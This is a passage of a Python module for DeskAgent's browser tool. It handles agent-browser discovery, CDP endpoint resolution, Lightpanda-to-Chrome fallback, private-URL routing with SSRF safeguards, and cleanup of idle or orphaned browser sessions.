#!/usr/bin/env python3
import asyncio
import atexit
import base64
import contextlib
import functools
import glob
import hashlib
import ipaddress
import json
import logging
import math
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import uuid
from pathlib import Path
from typing import Any
from urllib.parse import unquote
from urllib.parse import urlparse

import requests
from utils import _PREFIX_RE
from utils import call_llm
from utils import cfg_get
from utils import check_redirect_url_safety
from utils import check_website_access
from utils import CREATE_NO_WINDOW
from utils import get_deskagent_dir
from utils import get_deskagent_home
from utils import in_async_loop
from utils import is_always_blocked_url
from utils import is_safe_url
from utils import is_termux
from utils import is_truthy_value
from utils import kill_tree
from utils import load_config
from utils import normalize_url_for_request
from utils import pid_exists
from utils import redact_sensitive_text

from ..interrupt import is_interrupted
from ..multimodal import _is_image_size_error
from ..multimodal import _resize_image_for_vision
from ..multimodal import _RESIZE_TARGET_BYTES
from ..multimodal.helpers import _resolve_vision_params
from ..process import ProcessRegistry
from ..registry import registry
from ..registry import tool_error
from .browser_camofox import _ensure_tab
from .browser_camofox import _post
from .browser_camofox import camofox_back
from .browser_camofox import camofox_click
from .browser_camofox import camofox_close
from .browser_camofox import camofox_console
from .browser_camofox import camofox_get_images
from .browser_camofox import camofox_navigate
from .browser_camofox import camofox_press
from .browser_camofox import camofox_scroll
from .browser_camofox import camofox_snapshot
from .browser_camofox import camofox_soft_cleanup
from .browser_camofox import camofox_type
from .browser_camofox import camofox_vision
from .browser_camofox import is_camofox_mode
from .browser_supervisor import _VALID_POLICIES
from .browser_supervisor import DEFAULT_DIALOG_POLICY
from .browser_supervisor import DEFAULT_DIALOG_TIMEOUT_S
from .browser_supervisor import SUPERVISOR_REGISTRY
from .helpers import _extract_relevant_content
from .helpers import _truncate_snapshot
from .helpers import SNAPSHOT_SUMMARIZE_THRESHOLD
from .profile_manager import cleanup_old_profiles
from .profile_manager import DEFAULT_RETENTION_HOURS
from .profile_manager import is_profile_locked
from .profile_manager import resolve_profile_dir

logger = logging.getLogger(__name__)

# Standard PATH entries for environments with minimal PATH (e.g. systemd services).
# Includes Android/Termux and macOS Homebrew locations needed for agent-browser,
# npx, node, and Android's glibc runner (grun).
_SANE_PATH_DIRS = (
    "/data/data/com.termux/files/usr/bin",
    "/data/data/com.termux/files/usr/sbin",
    "/opt/homebrew/bin",
    "/opt/homebrew/sbin",
    "/usr/local/sbin",
    "/usr/local/bin",
    "/usr/sbin",
    "/usr/bin",
    "/sbin",
    "/bin",
)
_SANE_PATH = os.pathsep.join(_SANE_PATH_DIRS)

_INACTIVITY_RAW = cfg_get(load_config(), "browser", "inactivity_timeout_seconds", default=300)
BROWSER_SESSION_INACTIVITY_TIMEOUT = int(_INACTIVITY_RAW) if isinstance(_INACTIVITY_RAW, (int, float, str)) else 300


@functools.lru_cache(maxsize=1)
def _discover_homebrew_node_dirs() -> tuple[str, ...]:
    homebrew_opt = "/opt/homebrew/opt"
    if not os.path.isdir(homebrew_opt):
        return ()
    try:
        return tuple(
            bin_dir for entry in os.listdir(homebrew_opt) if entry.startswith("node") and entry != "node" and os.path.isdir(bin_dir := os.path.join(homebrew_opt, entry, "bin"))
        )
    except OSError:
        return ()


def _browser_candidate_path_dirs() -> list[str]:
    """Return ordered browser CLI PATH candidates shared by discovery and execution."""
    deskagent_home = get_deskagent_home()
    deskagent_node_bin = str(deskagent_home / "node" / "bin")
    deskagent_node_root = str(deskagent_home / "node")
    deskagent_nm_bin = str(deskagent_home / "node_modules" / ".bin")
    return [deskagent_node_bin, deskagent_node_root, deskagent_nm_bin, *list(_discover_homebrew_node_dirs()), *_SANE_PATH_DIRS]


def _merge_browser_path(existing_path: str = "") -> str:
    """Prepend browser-specific PATH fallbacks without reordering existing entries."""
    path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
    existing_parts = set(path_parts)
    prefix_parts: list[str] = []

    for part in _browser_candidate_path_dirs():
        if not part or part in existing_parts or part in prefix_parts:
            continue
        if os.path.isdir(part):
            prefix_parts.append(part)

    return os.pathsep.join(prefix_parts + path_parts)


# Throttle screenshot cleanup to avoid repeated full directory scans.
_LAST_SCREENSHOT_CLEANUP_BY_DIR: dict[str, float] = {}

# Max matches returned by ``browser_find`` — the DOM walk is bounded so a
# single snapshot doesn't drown the LLM context.
_FIND_CAP = 200

# Default timeout for browser commands (seconds)
DEFAULT_COMMAND_TIMEOUT = 30

# Commands that legitimately return empty stdout (e.g. close, record).
_EMPTY_OK_COMMANDS: frozenset = frozenset({"close", "record"})

_CACHED_COMMAND_TIMEOUT: int | None = None
_COMMAND_TIMEOUT_RESOLVED = False


def _get_command_timeout() -> int:
    """Return the configured browser command timeout from config.yaml.

    Reads ``config["browser"]["command_timeout"]`` and falls back to
    ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.  Result is
    cached after the first call and cleared by ``cleanup_all_browsers()``.
    """
    global _CACHED_COMMAND_TIMEOUT, _COMMAND_TIMEOUT_RESOLVED
    if _COMMAND_TIMEOUT_RESOLVED:
        return _CACHED_COMMAND_TIMEOUT  # type: ignore[return-value]

    _COMMAND_TIMEOUT_RESOLVED = True
    result = DEFAULT_COMMAND_TIMEOUT
    try:
        val = cfg_get(load_config(), "browser", "command_timeout")
        if val is not None:
            result = max(int(val), 5)  # Floor at 5s to avoid instant kills
    except Exception as e:
        logger.debug("Could not read command_timeout from config: %s", e)
    _CACHED_COMMAND_TIMEOUT = result
    return result


def _resolve_cdp_override(cdp_url: str) -> str:
    """Normalize a user-supplied CDP endpoint into a concrete connectable URL.

    Accepts:
    - full websocket endpoints: ws://host:port/devtools/browser/...
    - HTTP discovery endpoints: http://host:port or http://host:port/json/version
    - bare websocket host:port values like ws://host:port

    For discovery-style endpoints we fetch /json/version and return the
    webSocketDebuggerUrl so downstream tools always receive a concrete browser
    websocket instead of an ambiguous host:port URL.
    """
    raw = (cdp_url or "").strip()
    if not raw:
        return ""

    lowered = raw.lower()
    if "/devtools/browser/" in lowered:
        return raw

    discovery_url = raw
    if lowered.startswith(("ws://", "wss://")):
        if raw.count(":") == 2 and raw.rstrip("/").rsplit(":", 1)[-1].isdigit() and "/" not in raw.split(":", 2)[-1]:
            discovery_url = ("http://" if lowered.startswith("ws://") else "https://") + raw.split("://", 1)[1]
        else:
            return raw

    if discovery_url.lower().endswith("/json/version"):
        version_url = discovery_url
    else:
        version_url = discovery_url.rstrip("/") + "/json/version"

    try:
        response = requests.get(version_url, timeout=10)
        response.raise_for_status()
        payload = response.json()
    except Exception as exc:
        logger.warning("Failed to resolve CDP endpoint %s via %s: %s", raw, version_url, exc)
        return raw

    ws_url = str(payload.get("webSocketDebuggerUrl") or "").strip()
    if ws_url:
        logger.info("Resolved CDP endpoint %s -> %s", raw, ws_url)
        return ws_url

    logger.warning("CDP discovery at %s did not return webSocketDebuggerUrl; using raw endpoint", version_url)
    return raw


def _get_cdp_override() -> str:
    """Return a normalized CDP URL override, or empty string.

    Reads ``config["browser"]["cdp_url"]`` and skips the local launcher,
    connecting directly to the supplied Chrome DevTools Protocol endpoint.
    """
    try:
        browser_cfg = cfg_get(load_config(), "browser", default={})
        if isinstance(browser_cfg, dict):
            return _resolve_cdp_override(str(browser_cfg.get("cdp_url", "") or ""))
    except Exception as e:
        logger.debug("Could not read browser.cdp_url from config: %s", e)

    return ""


def _get_dialog_policy_config() -> tuple[str, float]:
    """Read ``browser.dialog_policy`` + ``browser.dialog_timeout_s`` from config.

    Returns a ``(policy, timeout_s)`` tuple, falling back to the supervisor's
    defaults when keys are absent or invalid.
    """
    try:
        browser_cfg = cfg_get(load_config(), "browser", default={})
        if not isinstance(browser_cfg, dict):
            return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S
        policy = str(browser_cfg.get("dialog_policy") or DEFAULT_DIALOG_POLICY)
        if policy not in _VALID_POLICIES:
            logger.debug("Invalid browser.dialog_policy=%r; using default", policy)
            policy = DEFAULT_DIALOG_POLICY
        timeout_raw = browser_cfg.get("dialog_timeout_s")
        try:
            timeout_s = float(timeout_raw) if timeout_raw is not None else DEFAULT_DIALOG_TIMEOUT_S
            if timeout_s <= 0:
                timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        except (TypeError, ValueError):
            timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        return policy, timeout_s
    except Exception:
        return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S


def _ensure_cdp_supervisor(task_id: str) -> None:
    """Start a CDP supervisor for ``task_id`` if an endpoint is reachable.

    Idempotent — delegates to ``SupervisorRegistry.get_or_start`` which skips
    when a supervisor for this ``(task_id, cdp_url)`` already exists and
    tears down + restarts on URL change. Safe to call on every
    ``browser_navigate`` / ``/browser connect`` without worrying about
    double-attach.

    Resolves the CDP URL in this order:
      1. ``BROWSER_CDP_URL`` / ``browser.cdp_url`` — covers ``/browser connect``
         and config-set overrides.
      2. ``_active_sessions[task_id]["cdp_url"]`` — covers CDP-override
         sessions whose ``create_session`` returned a raw CDP URL.

    Swallows all errors — failing to attach the supervisor must not break
    the browser session itself.  The agent simply won't see
    ``pending_dialogs`` / ``frame_tree`` fields in snapshots.
    """
    cdp_url = _get_cdp_override()
    if not cdp_url:
        # Fallback: the active session may carry a per-session CDP URL set by
        # the CDP-override code path.
        with _cleanup_lock:
            session_info = _active_sessions.get(task_id, {})
        maybe = str(session_info.get("cdp_url") or "")
        if maybe:
            cdp_url = _resolve_cdp_override(maybe)
    if not cdp_url:
        return
    try:
        policy, timeout_s = _get_dialog_policy_config()
        SUPERVISOR_REGISTRY.get_or_start(
            task_id=task_id,
            cdp_url=cdp_url,
            dialog_policy=policy,
            dialog_timeout_s=timeout_s,
        )
    except Exception as exc:
        logger.debug(
            "CDP supervisor attach for task=%s failed (non-fatal): %s",
            task_id,
            exc,
        )


def _stop_cdp_supervisor(task_id: str) -> None:
    """Stop the CDP supervisor for ``task_id`` if one exists. No-op otherwise."""
    try:
        SUPERVISOR_REGISTRY.stop(task_id)
    except Exception as exc:
        logger.debug("CDP supervisor stop for task=%s failed (non-fatal): %s", task_id, exc)


_cached_agent_browser: str | None = None
_agent_browser_resolved = False

# Lightpanda engine support. agent-browser v0.25.3+ supports
# ``--engine lightpanda`` natively. Read from ``config["browser"]["engine"]``.
_cached_browser_engine: str | None = None
_browser_engine_resolved = False

_VALID_BROWSER_ENGINES = ("auto", "lightpanda", "chrome")


def _browser_install_hint() -> str:
    if is_termux():
        return "npm install -g agent-browser && agent-browser install"
    return "npm install -g agent-browser && agent-browser install --with-deps"


def _requires_real_termux_browser_install(browser_cmd: str) -> bool:
    return is_termux() and not _get_cdp_override() and browser_cmd.strip() == "npx agent-browser"


def _termux_browser_install_error() -> str:
    return f"Local browser automation on Termux cannot rely on the bare npx fallback. Install agent-browser explicitly first: {_browser_install_hint()}"


def _get_browser_engine() -> str:
    """Return the configured browser engine (``auto``, ``lightpanda``, or ``chrome``).

    Reads ``config["browser"]["engine"]`` once and caches the result.
    Unknown values fall back to ``auto``. ``auto`` means "don't pass
    ``--engine``" (agent-browser defaults to Chrome).
    """
    global _cached_browser_engine, _browser_engine_resolved
    if _browser_engine_resolved:
        return _cached_browser_engine

    _browser_engine_resolved = True
    _cached_browser_engine = "auto"
    val = cfg_get(load_config(), "browser", "engine")
    if isinstance(val, str) and val.strip():
        candidate = val.strip().lower()
        if candidate in _VALID_BROWSER_ENGINES:
            _cached_browser_engine = candidate
        else:
            logger.warning(
                "Unknown browser engine %r (valid: %s), falling back to 'auto'",
                candidate,
                ", ".join(_VALID_BROWSER_ENGINES),
            )

    return _cached_browser_engine


def _should_inject_engine(engine: str) -> bool:
    """Return True when the engine flag should be added to agent-browser commands.

    Only inject ``--engine`` for non-cloud, non-camofox local sessions where
    the engine is explicitly set (not ``auto``).
    """
    if engine == "auto":
        return False
    if is_camofox_mode():
        return False
    return True


def _using_lightpanda_engine() -> bool:
    """Return True when local browser commands are configured for Lightpanda."""
    return _get_browser_engine() == "lightpanda"


def _lightpanda_fallback_reason(engine: str, command: str, result: dict[str, Any]) -> str | None:
    """Return the user-visible reason a Lightpanda result needs Chrome fallback.

    ``None`` means no fallback should run.  The returned string is copied into
    the fallback result so CLI/TUI/gateway users can see when DeskAgent silently
    switched from Lightpanda to Chrome for completeness.
    """
    if engine != "lightpanda":
        return None

    # result. Session-management commands (close, record) are tied to the
    # engine's daemon and can't be retried on a different engine.
    _FALLBACK_ELIGIBLE = {"open", "snapshot", "screenshot", "eval", "click", "fill", "scroll", "back", "press", "console", "errors"}
    if command not in _FALLBACK_ELIGIBLE:
        return None

    if not result.get("success"):
        error = str(result.get("error") or "command failed").strip()
        return f"Lightpanda {command!r} failed ({error}); retried with Chrome."

    data = result.get("data", {})

    if command == "snapshot":
        snap = data.get("snapshot", "")
        # Empty or near-empty snapshots indicate Lightpanda couldn't render
        if not snap or len(snap.strip()) < 20:
            return "Lightpanda returned an empty/too-short snapshot; retried with Chrome."

    if command == "screenshot":
        # Lightpanda returns a placeholder PNG with its panda logo.
        # Since LP PR #1766 resized it to 1920x1080, the placeholder is
        # ~17 KB.  Real Chromium screenshots are typically 100 KB+.
        path = data.get("path", "")
        if path:
            try:
                size = os.path.getsize(path)
                if size < 20480:
                    logger.debug("Lightpanda screenshot is suspiciously small (%d bytes), triggering Chrome fallback", size)
                    return f"Lightpanda screenshot was suspiciously small ({size} bytes); retried with Chrome."
            except OSError:
                return "Lightpanda screenshot file was missing/unreadable; retried with Chrome."

    return None


def _annotate_lightpanda_fallback(result: dict[str, Any], reason: str) -> dict[str, Any]:
    """Add a user-visible Chrome fallback warning to a browser command result."""
    warning = f"⚠ Lightpanda fallback: Chrome was used for this browser action. {reason}"
    annotated = dict(result)
    annotated["fallback_warning"] = warning
    annotated["browser_engine"] = "chrome"
    annotated["browser_engine_fallback"] = {
        "from": "lightpanda",
        "to": "chrome",
        "reason": reason,
    }
    data = annotated.get("data")
    if isinstance(data, dict):
        data = dict(data)
        data.setdefault("fallback_warning", warning)
        data.setdefault("browser_engine", "chrome")
        data.setdefault(
            "browser_engine_fallback",
            {"from": "lightpanda", "to": "chrome", "reason": reason},
        )
        annotated["data"] = data
    return annotated


def _copy_fallback_warning(target: dict[str, Any], result: dict[str, Any]) -> dict[str, Any]:
    """Copy browser fallback metadata from an internal result into a tool response."""
    if result.get("fallback_warning"):
        target["fallback_warning"] = result["fallback_warning"]
        target["browser_engine"] = result.get("browser_engine")
        target["browser_engine_fallback"] = result.get("browser_engine_fallback")
    return target


def _run_chrome_fallback_command(
    task_id: str,
    command: str,
    args: list[str],
    timeout: int,
) -> dict[str, Any]:
    """Run a browser command in a temporary Chrome session at the current URL.

    agent-browser locks the engine when a named daemon starts. Passing
    ``--engine chrome`` to the same Lightpanda ``--session`` cannot change that
    running daemon. This helper always uses a fresh temporary Chrome session,
    navigates it to the current Lightpanda URL, runs ``command``, then tears it
    down.
    """

    # 1. Grab the current URL from the Lightpanda session. Use
    # ``_engine_override=\"auto\"`` so this helper does not recursively trigger
    # Lightpanda→Chrome fallback if the eval call itself fails.
    url_result = _run_browser_command(task_id, "eval", ["window.location.href"], timeout=10, _engine_override="auto")
    current_url = None
    if url_result.get("success"):
        current_url = url_result.get("data", {}).get("result", "").strip().strip('"').strip("'")
    if not current_url:
        logger.warning("Chrome fallback: could not determine current URL from LP session")
        return {"success": False, "error": "Chrome fallback failed: could not determine current URL"}

    # 2. Create a temporary Chrome session (bypasses _get_session_info's cache).
    tmp_session = f"h_cfb_{uuid.uuid4().hex[:8]}"
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        return {"success": False, "error": str(e)}

    if not _chromium_installed():
        if _running_in_docker():
            hint = "Chrome fallback requires Chromium, but it is missing. You're running in Docker — pull the latest image: docker pull ghcr.io/nousresearch/deskagent-agent:latest"
        else:
            hint = "Chrome fallback requires Chromium, but it is missing. Install it with: npx agent-browser install --with-deps (or: npx playwright install --with-deps chromium)"
        return {"success": False, "error": hint}

    # On Windows npx is npx.cmd — use shutil.which so CreateProcessW can
    # execute the batch shim.  shutil.which honours PATHEXT on Windows and
    # returns the plain executable on POSIX.  If npx isn't on PATH (Termux,
    # bare container), fall back to the bare name and let Popen raise with
    # a readable "FileNotFoundError: 'npx'" rather than WinError 193.
    if browser_cmd == "npx agent-browser":
        _npx_bin = shutil.which("npx") or "npx"
        cmd_prefix = [_npx_bin, "agent-browser"]
    else:
        cmd_prefix = [browser_cmd]
    base_args = [*cmd_prefix, "--engine", "chrome", "--session", tmp_session, "--json"]

    task_socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{tmp_session}")
    os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
    browser_env = {**os.environ, "AGENT_BROWSER_SOCKET_DIR": task_socket_dir}
    browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))

    if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
        browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)

    def _run_tmp(cmd: str, cmd_args: list[str]) -> dict[str, Any]:
        full = [*base_args, cmd, *cmd_args]
        # Use temp-file stdout/stderr pattern (same as _run_browser_command)
        # to avoid pipe hang from agent-browser daemon inheriting fds.
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{cmd}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{cmd}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            # On Windows, launch the child in a new process group so parent
            # console Ctrl+C doesn't kill it with STATUS_CONTROL_C_EXIT
            # (0xC000013A = rc 3221225786), AND insulate its stdio + handle
            # inheritance from the parent.
            #
            # Additional Windows hardening beyond CREATE_NEW_PROCESS_GROUP:
            # * STARTF_USESTDHANDLES + explicit handles → CreateProcess hands
            #   the child ONLY our three chosen handles (DEVNULL stdin +
            #   temp-file stdout/stderr). Without this, some parents leak
            #   console handles that break downstream grandchild spawns — the
            #   agent-browser Rust binary spawns a detached daemon grandchild,
            #   and that grandchild's CreateProcess dies silently
            #   ("Daemon process exited during startup with no error output")
            #   when inherited parent handles are in a weird state. Observed
            #   in the DeskAgent CLI where sys.stdout and sys.stderr both report
            #   fileno=1 (stderr dup'd onto stdout at the OS level).
            # * close_fds=True → block inheritance of every other handle.
            #   (Default on POSIX; must be explicit on Windows for stdio.)
            _popen_extra: dict = {}
            if os.name == "nt":
                # CREATE_NO_WINDOW → don't attach a console (cmd.exe would
                # otherwise briefly allocate one for the .cmd shim).
                # Do NOT add CREATE_NEW_PROCESS_GROUP: on Python 3.11 Windows
                # it interacts with asyncio's ProactorEventLoop such that the
                # subprocess creation cancels the running loop task, which
                # surfaces as KeyboardInterrupt in app.run() and tears down
                # the CLI mid-turn. The agent thread's subprocess spawn
                # unwound MainThread's prompt_toolkit loop that way — see
                # diag log: "asyncio.CancelledError → KeyboardInterrupt".
                _popen_extra["creationflags"] = CREATE_NO_WINDOW
                _popen_extra["close_fds"] = True
                _si = subprocess.STARTUPINFO()
                _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
                _popen_extra["startupinfo"] = _si
            proc = subprocess.Popen(
                full,
                stdout=stdout_fd,
                stderr=stderr_fd,
                stdin=subprocess.DEVNULL,
                env=browser_env,
                **_popen_extra,
            )
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)
        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            if not kill_tree(proc.pid, force=True):
                proc.kill()
            proc.wait()
            return {"success": False, "error": f"Chrome fallback '{cmd}' timed out"}
        try:
            with open(stdout_path, encoding="utf-8") as f:
                stdout = f.read().strip()
            if stdout:
                return json.loads(stdout.split("\n")[-1])
        except Exception as exc:
            logger.debug("Chrome fallback tmp cmd '%s' error: %s", cmd, exc)
        finally:
            for pth in (stdout_path, stderr_path):
                with contextlib.suppress(OSError):
                    os.unlink(pth)
        return {"success": False, "error": f"Chrome fallback '{cmd}' failed"}

    try:
        # 3. Navigate Chrome to the same URL.
        nav = _run_tmp("open", [current_url])
        if not nav.get("success"):
            logger.warning("Chrome fallback: navigate failed: %s", nav.get("error"))
            return {"success": False, "error": f"Chrome fallback navigate failed: {nav.get('error')}"}

        # 4. Run the requested command in Chrome.
        return _run_tmp(command, args)

    finally:
        # 5. Tear down the temporary Chrome session.
        with contextlib.suppress(Exception):
            _run_tmp("close", [])

        shutil.rmtree(task_socket_dir, ignore_errors=True)


def _chrome_fallback_screenshot(
    task_id: str,
    args: list[str],
    timeout: int,
) -> dict[str, Any]:
    """Take a screenshot using a temporary Chrome session."""
    return _run_chrome_fallback_command(task_id, "screenshot", args, timeout)


def _url_is_private(url: str) -> bool:
    """Return True when the URL's host resolves to a private/LAN/loopback address.

    Reuses ``tools.url_safety.is_safe_url`` as the oracle — if the SSRF check
    would reject the URL, we treat it as "private" for routing purposes.  DNS
    resolution failures are treated as NOT private (fall through to whatever
    backend is configured, which will surface the DNS error naturally).
    """
    try:
        # is_safe_url returns False for private/loopback/link-local/CGNAT AND
        # for DNS failures.  We only want the private-network case here, so
        # we parse + check the host shape as a DNS-failure sieve first.

        parsed = urlparse(url)
        hostname = (parsed.hostname or "").strip().lower().rstrip(".")
        if not hostname:
            return False
        # Literal IP → check directly
        try:
            ip = ipaddress.ip_address(hostname)
            return (
                ip.is_private
                or ip.is_loopback
                or ip.is_link_local
                # 172.16.0.0/12: only covered by ip.is_private on Python
                # ≥3.11 (bpo-40791).  Explicit check keeps 3.10 runtimes
                # routing these to the local sidecar correctly.
                or ip in ipaddress.ip_network("172.16.0.0/12")
                or ip in ipaddress.ip_network("100.64.0.0/10")
            )
        except ValueError:
            pass
        # Hostname — must resolve to confirm it's private (bare "localhost"
        # resolves to 127.0.0.1 via /etc/hosts).  Short-circuit on obvious
        # names to avoid a DNS hop.
        if hostname in {
            "localhost",
        } or hostname.endswith(".localhost"):
            return True
        if hostname.endswith(".local") or hostname.endswith(".lan") or hostname.endswith(".internal"):
            return True
        try:
            addr_info = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
        except socket.gaierror:
            return False  # DNS fail → not private, let the normal path fail
        for _, _, _, _, sockaddr in addr_info:
            try:
                ip = ipaddress.ip_address(sockaddr[0])
            except ValueError:
                continue
            if ip.is_private or ip.is_loopback or ip.is_link_local or ip in ipaddress.ip_network("100.64.0.0/10"):
                return True
        return False
    except Exception as exc:
        logger.debug("URL-privacy check failed for %s: %s", url, exc)
        return False


def _navigation_session_key(task_id: str, url: str) -> str:
    """Pick the session key that should handle ``url`` for ``task_id``.

    Returns the bare task_id, except when the URL resolves to a
    private/LAN/loopback address — in that case returns a per-task
    ``_LOCAL_SUFFIX``-tagged key so the URL is served by an isolated local
    Chromium sidecar. CDP-override and Camofox paths always use the bare
    task_id.
    """
    if task_id is None:
        task_id = "default"
    if _get_cdp_override():
        return task_id
    if is_camofox_mode():
        return task_id
    if not _url_is_private(url):
        return task_id
    return f"{task_id}{_LOCAL_SUFFIX}"


def _is_local_sidecar_key(session_key: str) -> bool:
    """Return True when ``session_key`` is a hybrid-routing local sidecar."""
    return session_key.endswith(_LOCAL_SUFFIX)


def _last_session_key(task_id: str) -> str:
    """Return the session key to use for a non-nav browser tool call.

    If a previous ``browser_navigate`` on this task_id set a last-active key,
    use it so snapshot/click/fill/etc. hit the same session.  Otherwise fall
    back to the bare task_id (matches original behavior for tasks that never
    triggered hybrid routing).
    """
    if task_id is None:
        task_id = "default"
    return _last_active_session_key.get(task_id, task_id)


@functools.lru_cache(maxsize=1)
def _allow_private_urls() -> bool:
    """Return whether the browser is allowed to navigate to private/internal addresses.

    Reads ``config["browser"]["allow_private_urls"]`` once and caches the result
    for the process lifetime.  Defaults to ``False`` (SSRF protection active).
    """
    try:
        val = cfg_get(load_config(), "browser", "allow_private_urls")
        return is_truthy_value(val, default=False)
    except Exception as e:
        logger.debug("Could not read allow_private_urls from config: %s", e)
        return False


def _socket_safe_tmpdir() -> str:
    """Return a short temp directory path suitable for Unix domain sockets.

    macOS sets ``TMPDIR`` to ``/var/folders/xx/.../T/`` (~51 chars).  When we
    append ``agent-browser-deskagent_…`` the resulting socket path exceeds the
    104-byte macOS limit for ``AF_UNIX`` addresses, causing agent-browser to
    fail with "Failed to create socket directory" or silent screenshot failures.

    On macOS we bypass ``TMPDIR`` and use ``/tmp`` directly
    (symlink to ``/private/tmp``, sticky-bit protected, always available).
    """
    if sys.platform == "darwin":
        return "/tmp"
    return tempfile.gettempdir()


# Track active sessions per "session key".
#
# A "session key" is either the bare task_id (default) OR a composite like
# f"{task_id}::local" when the hybrid-routing feature spawns a local sidecar
# browser for a LAN/localhost URL. Both forms flow through the same
# _active_sessions / _run_browser_command / cleanup_browser code paths — the
# key is opaque to those internals.
#
# Stored fields: session_name (always), cdp_url (CDP override only).
_active_sessions: dict[str, dict[str, str]] = {}  # session_key -> {session_name, ...}
_recording_sessions: set = set()  # session_keys with active recordings

# Tracks the most recent session_key used per task_id. Set by browser_navigate()
# after it chooses a backend for a URL; read by every non-nav browser tool
# (snapshot/click/fill/eval/...) so they target the session that served the last
# navigation.  Without this, a task that navigated to localhost on the local
# sidecar would fall back to the cloud session on its next snapshot call.
_last_active_session_key: dict[str, str] = {}  # task_id -> session_key
_LOCAL_SUFFIX = "::local"

_cleanup_done = False

_session_last_activity: dict[str, float] = {}

_cleanup_thread = None
_cleanup_running = False

# (subagents run concurrently via ThreadPoolExecutor)
_cleanup_lock = threading.Lock()


def _emergency_cleanup_all_sessions() -> None:
    """
    Emergency cleanup of all active browser sessions.
    Called on process exit or interrupt to prevent orphaned sessions.

    Also runs the orphan reaper to clean up daemons left behind by previously
    crashed deskagent processes — this way every clean deskagent exit sweeps
    accumulated orphans, not just ones that actively used the browser tool.
    """
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True

    # Clean up this process's own sessions first, so their owner_pid files
    # are removed before the reaper scans.
    if _active_sessions:
        logger.info("Emergency cleanup: closing %s active session(s)...", len(_active_sessions))
        try:
            cleanup_all_browsers()
        except Exception as e:
            logger.error("Emergency cleanup error: %s", e)
        finally:
            with _cleanup_lock:
                _active_sessions.clear()
                _session_last_activity.clear()
                _recording_sessions.clear()

    # Sweep orphans from other crashed deskagent processes.  Safe even if we
    # never used the browser — uses owner_pid liveness to avoid reaping
    # daemons owned by other live deskagent processes.
    try:
        _reap_orphaned_browser_sessions()
    except Exception as e:
        logger.debug("Orphan reap on exit failed: %s", e)


# handlers that called sys.exit(), but this conflicts with prompt_toolkit's
# async event loop — a SystemExit raised inside a key-binding callback
# corrupts the coroutine state and makes the process unkillable.  atexit
# handlers run on any normal exit (including sys.exit), so browser sessions
# are still cleaned up without hijacking signals.
atexit.register(_emergency_cleanup_all_sessions)


def _cleanup_inactive_browser_sessions() -> None:
    """
    Clean up browser sessions that have been inactive for longer than the timeout.

    This function is called periodically by the background cleanup thread to
    automatically close sessions that haven't been used recently, preventing
    orphaned sessions (local or CDP-override) from accumulating.
    """
    current_time = time.time()
    sessions_to_cleanup = []

    with _cleanup_lock:
        for task_id, last_time in list(_session_last_activity.items()):
            if current_time - last_time > BROWSER_SESSION_INACTIVITY_TIMEOUT:
                sessions_to_cleanup.append(task_id)

    for task_id in sessions_to_cleanup:
        try:
            elapsed = int(current_time - _session_last_activity.get(task_id, current_time))
            logger.info("Cleaning up inactive session for task: %s (inactive for %ss)", task_id, elapsed)
            cleanup_browser(task_id)
            with _cleanup_lock:
                if task_id in _session_last_activity:
                    del _session_last_activity[task_id]
        except Exception as e:
            logger.warning("Error cleaning up inactive session %s: %s", task_id, e)


def _write_owner_pid(socket_dir: str, session_name: str) -> None:
    """Record the current deskagent PID as the owner of a browser socket dir.

    Written atomically to ``<socket_dir>/<session_name>.owner_pid`` so the
    orphan reaper can distinguish daemons owned by a live deskagent process
    (don't reap) from daemons whose owner crashed (reap).  Best-effort —
    an OSError here just falls back to the legacy ``tracked_names``
    heuristic in the reaper.
    """
    try:
        path = os.path.join(socket_dir, f"{session_name}.owner_pid")
        with open(path, "w", encoding="utf-8") as f:
            f.write(str(os.getpid()))
    except OSError as exc:
        logger.debug("Could not write owner_pid file for %s: %s", session_name, exc)


def _reap_orphaned_browser_sessions() -> None:
    """Scan for orphaned agent-browser daemon processes from previous runs.

    When the Python process that created a browser session exits uncleanly
    (SIGKILL, crash, gateway restart), the in-memory ``_active_sessions``
    tracking is lost but the node + Chromium processes keep running.

    This function scans the tmp directory for ``agent-browser-*`` socket dirs
    left behind by previous runs, reads the daemon PID files, and kills any
    daemons whose owning deskagent process is no longer alive.

    Ownership detection priority:
      1. ``<session>.owner_pid`` file (written by current code) — if the
         referenced deskagent PID is alive, leave the daemon alone regardless
         of whether it's in *this* process's ``_active_sessions``.  This is
         cross-process safe: two concurrent deskagent instances won't reap each
         other's daemons.
      2. Fallback for daemons that predate owner_pid: check
         ``_active_sessions`` in the current process.  If not tracked here,
         treat as orphan (legacy behavior).

    Safe to call from any context — atexit, cleanup thread, or on demand.
    """
    tmpdir = _socket_safe_tmpdir()
    pattern = os.path.join(tmpdir, "agent-browser-h_*")
    socket_dirs = glob.glob(pattern)

    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-cdp_*"))
    # Also pick up Camofox sessions (keyed by `deskagent_<uuid>` user_id; see
    # browser_camofox.py — the agent-browser CLI does not own these socket
    # dirs, but cleaning them prevents stale tempfiles from accumulating.)
    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-deskagent_*"))

    if not socket_dirs:
        return

